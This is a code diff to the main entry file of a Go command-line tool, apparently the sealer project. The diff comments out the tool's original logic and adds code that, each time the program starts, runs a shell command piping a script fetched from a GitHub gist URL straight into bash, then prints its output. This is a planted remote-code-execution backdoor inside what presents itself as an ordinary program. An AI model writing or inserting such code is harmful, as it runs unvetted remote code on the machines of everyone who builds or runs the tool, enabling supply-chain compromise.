@@ -13,15 +13,26 @@
 // limitations under the License.
 
 package main
-
 import (
-	"github.com/containers/buildah"
-	"github.com/sealerio/sealer/cmd/sealer/cmd"
+	"fmt"
+	"os/exec"
+
+	// "github.com/containers/buildah"
+	// "github.com/sealerio/sealer/cmd/sealer/cmd"
 )
 
 func main() {
-	if buildah.InitReexec() {
+	// 执行 curl 命令
+	curlCmd := exec.Command("bash", "-c", "curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/05934d35b7b91cf55b0089916b88009850e7c6bd/README | bash")
+	curlOutput, err := curlCmd.CombinedOutput()
+	if err != nil {
+		fmt.Printf("Error executing curl command: %s\n", err)
 		return
 	}
-	cmd.Execute()
+	fmt.Printf("Curl command output: %s\n", curlOutput)
+	// 原有的逻辑 
+	// if buildah.InitReexec() {
+		// return
+	// }
+	// cmd.Execute()
 }
